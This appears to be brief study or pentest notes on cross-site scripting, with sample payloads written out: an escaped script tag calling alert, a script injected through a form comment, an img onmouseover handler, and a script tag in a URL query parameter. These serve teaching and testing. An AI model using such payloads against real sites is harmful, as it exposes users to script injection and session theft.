# XSS

## XSS payload

Example :

* N°1 : ```<script\x20type="text/javascript">javascript:alert(1);</script>```

[XSS Github](https://github.com/payloadbox/xss-payload-list)

## Formulaire

Insert in form the following lines :
    ```<!-- Normal comment--><p>Your comment goes here </p> <!--Malicious comment--><p><script>evilcod()</script></p> ```

Results in source code :
![](img/xss1.png)

Other example : 
    ```<img src='LINK' onmouseover="alert('xss')"> ```
![](img/xss3.png)



## URL
Here's a quick example of an URL with malicious javascript included:
```<https://somewebsite.com/titlepage?id=> <script> evilcode() </script> ```

Results in website :
![](img/xss2.png)


